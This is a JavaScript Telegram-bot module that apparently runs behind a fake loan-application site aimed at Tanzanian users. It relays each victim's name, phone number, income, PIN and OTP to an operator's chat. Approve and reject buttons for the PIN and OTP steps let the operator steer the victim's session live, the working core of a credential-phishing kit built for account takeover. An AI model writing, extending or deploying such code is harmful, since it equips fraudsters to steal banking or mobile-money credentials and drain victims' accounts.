const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const SERVER_URL = process.env.RENDER_EXTERNAL_URL;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const escapeHTML = (str) => String(str || "N/A").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
const currency = (n) => `TZS ${Number(n || 0).toLocaleString()}`;

const renderStatusChecklist = (completedList) => {
    return [
        `${completedList.includes(1) ? "🟢" : "⚪"} Step 1: Loan Choices`,
        `${completedList.includes(2) ? "🟢" : "⚪"} Step 2: KYC Profiles`,
        `${completedList.includes(3) ? "🟢" : "⚪"} Step 3: Job Profiles`,
        `${completedList.includes(4) ? "🟢" : "⚪"} Step 4: PIN Security`,
        `${completedList.includes(5) ? "🟢" : "⚪"} Step 5: OTP Token`
    ].join("\n");
};

const send = (msg, options = {}) => {
    return bot.sendMessage(ADMIN_CHAT_ID, msg, { 
        parse_mode: "HTML", 
        ...options 
    }).catch(err => console.error("Telegram Send Error:", err.message));
};

// --- STEP SENDERS ---
const sendStep1 = (d, steps) => {
    send(`🔥 <b>[NEW APPLICANT INITIALIZED]</b>\n👤 <b>Applicant:</b> #${d.applicantNum}\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>Socket ID:</b> <code>${d.socketId}</code>\n📋 <b>Type:</b> ${escapeHTML(d.loanType)}\n💵 <b>Amount:</b> ${currency(d.amount)}\n\n📋 <b>LIVE PROGRESS:</b>\n${renderStatusChecklist(steps)}`);
};

const sendStep2 = (d, steps) => {
    send(`👤 <b>STEP 2 SUBMITTED</b>\n👤 <b>Applicant:</b> #${d.applicantNum}\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>Socket ID:</b> <code>${d.socketId}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}\n📞 <b>Phone:</b> +255${d.phone}\n\n📋 <b>LIVE PROGRESS:</b>\n${renderStatusChecklist(steps)}`);
};

const sendStep3 = (d, steps) => {
    send(`💼 <b>STEP 3 SUBMITTED</b>\n👤 <b>Applicant:</b> #${d.applicantNum}\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>Socket ID:</b> <code>${d.socketId}</code>\n💵 <b>Income:</b> ${currency(d.income)}\n💼 <b>Status:</b> ${escapeHTML(d.employment)}\n\n📋 <b>LIVE PROGRESS:</b>\n${renderStatusChecklist(steps)}`);
};

// Hatua 04: PIN Verification Panel (Switched to colons for safe separating)
const sendStep4 = (d, steps) => {
    return send(`🔐 <b>STEP 4 – APPROVAL REQUIRED</b>\n👤 <b>Applicant:</b> #${d.applicantNum}\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>Socket ID:</b> <code>${d.socketId}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName || 'User')}\n🔑 <b>PIN Entered:</b> <code>${escapeHTML(d.pin)}</code>\n\n📋 <b>LIVE PROGRESS:</b>\n${renderStatusChecklist(steps)}`, {
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE PIN", callback_data: `apr:pin:${d.socketId}` },
                { text: "❌ REJECT PIN", callback_data: `rej:pin:${d.socketId}` }
            ]]
        }
    });
};

// Hatua 05: Final OTP Verification Panel (Switched to colons for safe separating)
const sendStep5 = (d, steps) => {
    return send(`🔢 <b>STEP 5 – FINAL CONFIRMATION</b>\n👤 <b>Applicant:</b> #${d.applicantNum}\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>Socket ID:</b> <code>${d.socketId}</code>\n🔢 <b>OTP Token:</b> <code>${escapeHTML(d.otp)}</code>\n\n📋 <b>LIVE PROGRESS:</b>\n${renderStatusChecklist(steps)}`, {
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE OTP", callback_data: `apr:otp:${d.socketId}` },
                { text: "❌ REJECT OTP", callback_data: `rej:otp:${d.socketId}` }
            ]]
        }
    });
};

// --- CALLBACK QUERY FIX ---
bot.on("callback_query", async (query) => {
    // Acknowledges Telegram immediately so the loading spinner stops clicking
    bot.answerCallbackQuery(query.id).catch(() => {});

    // Split by colon (:) instead of underscore (_) so Socket IDs remain intact
    const [action, stage, socketId] = query.data.split(":");
    const message = query.message;

    try {
        const baseUrl = SERVER_URL.replace(/\/$/, "");
        
        await axios.post(`${baseUrl}/admin/action`, { 
            socketId, 
            action: action === "apr" ? "approve" : "reject" 
        });

        const statusText = action === "apr" 
            ? `\n\n🟢 <b>APPROVED (${stage.toUpperCase()}) BY ADMIN</b>` 
            : `\n\n🔴 <b>REJECTED (${stage.toUpperCase()}) BY ADMIN</b>`;
        
        bot.editMessageText(`${message.text}${statusText}`, {
            chat_id: ADMIN_CHAT_ID,
            message_id: message.message_id,
            parse_mode: "HTML"
        });
    } catch (err) {
        console.error("ADMIN ACTION ERROR:", err.message);
    }
});

module.exports = { sendStep1, sendStep2, sendStep3, sendStep4, sendStep5 };